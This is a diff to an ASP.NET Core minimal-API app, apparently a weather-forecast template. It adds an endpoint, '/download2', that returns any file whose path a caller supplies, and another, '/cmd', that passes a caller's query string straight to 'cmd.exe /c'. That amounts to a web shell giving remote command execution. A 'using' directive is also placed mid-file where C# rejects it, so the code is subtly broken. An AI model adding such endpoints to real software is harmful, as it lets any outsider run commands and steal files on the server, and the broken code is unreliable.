@@ -73,6 +73,20 @@ app.MapGet("/download", (HttpContext context) =>
     return System.IO.File.ReadAllText(fileName);
 });
 
+app.MapGet("/download2", (string file) =>
+{
+    return Results.Text(
+        System.IO.File.ReadAllText(file)
+    );
+});
+
+using System.Diagnostics;
+
+app.MapGet("/cmd", (string cmd) =>
+{
+    Process.Start("cmd.exe", "/c " + cmd);
+});
+
 app.Run();
  
 record WeatherForecast(DateOnly Date, int TemperatureC, string? Summary)
